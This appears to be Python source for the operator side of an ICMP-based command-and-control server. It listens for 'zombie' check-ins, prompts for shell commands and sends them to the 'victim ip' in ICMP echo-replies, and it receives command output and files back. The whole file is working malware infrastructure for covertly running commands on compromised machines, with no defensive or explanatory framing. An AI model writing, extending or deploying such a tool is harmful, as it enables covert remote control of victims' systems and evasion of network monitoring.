
from icmp_c2_modules import *

zombie_msg = "ready"
ICMP_REQUEST = "icmp[0]=8"

    
def parse_packet(packet):
    if Raw in packet:
        data_recieved = extract_data(packet)
        print("data:" + data_recieved)                             
        victim_ip = packet[IP].src
        if data_recieved.lower() == zombie_msg:
            command = input("Enter cmd to run:")
            command = "run " + command
            print("victim ip:" + victim_ip)
            pkt_send(dest=victim_ip,data=command,icmp_type="echo-reply")
            print("command sent:" + command)
            
        elif data_recieved.startswith("output"):
            print("data:" + data_recieved)
        
        elif data_recieved.startswith("file"):
            print("should recieve file")
    print("back to listen")       
    server_listen()
                        

# Start sniffing packets
def server_listen():
    sniff_pkt(ICMP_REQUEST,parse_packet,cnt=1)
    

signal.signal(signal.SIGINT, signal_handler)
print("start listening")
server_listen()




